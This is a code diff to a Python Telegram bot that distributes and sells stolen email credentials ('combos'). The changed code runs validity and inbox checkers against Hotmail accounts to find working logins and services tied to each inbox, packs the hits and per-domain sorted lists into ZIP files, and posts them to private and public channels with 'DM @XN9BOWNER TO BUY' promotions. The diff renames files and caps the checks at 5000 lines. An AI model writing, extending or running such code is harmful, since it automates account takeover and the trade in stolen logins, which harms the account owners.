@@ -677,7 +677,6 @@ async def monitor_loop():
                             except Exception as e:
                                 log.error(f"Failed to DM owner: {e}")
 
-                        # Telegram — post all chunks
                         if toggles["telegram"]:
                             tg_header = (
                                 f"WAR CLOUD PRIVATE {label.upper()}\n"
@@ -687,42 +686,39 @@ async def monitor_loop():
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                             )
                             for chunk in chunks:
-                                fname = f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt"
+                                fname = f"{label} {len(chunk)} by @xn9bowner.txt"
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
 
-                            # Validity check + inbox checker (hotmail only)
+                            # Validity check + inbox checker (hotmail only, skip if over 5000 lines)
                             if label == "hotmail":
-                                try:
-                                    # First check which accounts are valid
-                                    valid_accounts = await run_validity_checker(all_raw)
-                                    if valid_accounts:
-                                        # Replace all_raw with only valid accounts
-                                        all_raw = valid_accounts
-                                        combined = ["\n".join(all_raw)]
-                                        chunks = [all_raw]
-                                        # Re-post main file with valid only
-                                        valid_fname = f"[ HOTMAIL ] [ {len(all_raw)} ] [ VALID ] [ @warprivate ].txt"
-                                        await send_telegram_file(tg_header + "\n".join(all_raw), valid_fname)
-                                        log.info(f"Posted {len(all_raw)} valid hotmail accounts")
-                                    else:
-                                        log.info("No valid hotmail accounts found")
+                                if len(all_raw) > 5000:
+                                    log.info(f"Skipping validity check — {len(all_raw)} combos exceeds 5000 limit")
+                                else:
+                                    try:
+                                        valid_accounts = await run_validity_checker(all_raw)
+                                        if valid_accounts:
+                                            valid_fname = f"hotmail {len(valid_accounts)} by @xn9bowner.txt"
+                                            await send_telegram_file(tg_header + "\n".join(valid_accounts), valid_fname)
+                                            log.info(f"Posted {len(valid_accounts)} valid hotmail accounts")
+                                        else:
+                                            log.info("No valid hotmail accounts found")
 
-                                    # Then run inbox checker on valid accounts only
-                                    service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
-                                    if service_map:
-                                        zip_buf = io.BytesIO()
-                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                                            for service, combos in service_map.items():
-                                                zf.writestr(f"{service}.txt", "\n".join(combos))
-                                        zip_buf.seek(0)
-                                        zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
-                                        await send_telegram_file(zip_buf.read(), zip_name)
-                                        log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
-                                except Exception as e:
-                                    log.error(f"Hotmail checker failed: {e}")
+                                        # Inbox checker on valid accounts
+                                        service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
+                                        if service_map:
+                                            zip_buf = io.BytesIO()
+                                            with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                                                for service, combos in service_map.items():
+                                                    zf.writestr(f"{service}.txt", "\n".join(combos))
+                                            zip_buf.seek(0)
+                                            zip_name = f"hotmail inbox hits by @xn9bowner.zip"
+                                            await send_telegram_file(zip_buf.read(), zip_name)
+                                            log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
+                                    except Exception as e:
+                                        log.error(f"Hotmail checker failed: {e}")
 
-                            # Post sorted domains ZIP (hotmail only)
+                            # Sorted domains ZIP (hotmail only)
                             if label == "hotmail":
                                 try:
                                     domain_map = {}
@@ -739,7 +735,7 @@ async def monitor_loop():
                                             for domain, combos in domain_map.items():
                                                 zf.writestr(f"{domain}.txt", "\n".join(combos))
                                         zip_buf.seek(0)
-                                        zip_name = f"[ {label.upper()} ] [ SORTED DOMAINS ] [ @warprivate ].zip"
+                                        zip_name = f"hotmail sorted domains by @xn9bowner.zip"
                                         await send_telegram_file(zip_buf.read(), zip_name)
                                         log.info(f"Posted sorted domains ZIP with {len(domain_map)} domain(s)")
                                 except Exception as e:
@@ -749,7 +745,7 @@ async def monitor_loop():
                                 private_post_count_ref = globals()
                                 private_post_count_ref["private_post_count"] += 1
                                 for chunk in chunks:
-                                    private_post_count_ref["recent_filenames"].append(f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt")
+                                    private_post_count_ref["recent_filenames"].append(f"{label} {len(chunk)} by @xn9bowner.txt")
                                 log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                 if private_post_count_ref["private_post_count"] >= 2:
                                     private_post_count_ref["private_post_count"] = 0
@@ -758,7 +754,7 @@ async def monitor_loop():
                                     pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
                                     promo_path = os.path.join("/app", "promo.gif")
                                     async with aiohttp.ClientSession() as sess:
-                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:  # TELEGRAM_PUBLIC_CHAT2 disabled
+                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT]:  # TELEGRAM_PUBLIC_CHAT2 disabled
                                             try:
                                                 if os.path.exists(promo_path):
                                                     form = aiohttp.FormData()
@@ -773,7 +769,7 @@ async def monitor_loop():
                                                     else:
                                                         log.info(f"Posted public update with gif to {pub_chat}")
                                                 else:
-                                                    log.warning(f"promo.png not found at {promo_path}, sending text only")
+                                                    log.warning(f"promo.gif not found at {promo_path}, sending text only")
                                                     resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                                         json={"chat_id": pub_chat, "text": pub_text})
                                                     body = await resp.json()
@@ -783,6 +779,8 @@ async def monitor_loop():
                                                         log.info(f"Posted public update to {pub_chat}")
                                             except Exception as e:
                                                 log.error(f"Failed to post public update to {pub_chat}: {e}")
+
+
 
 
                     else:
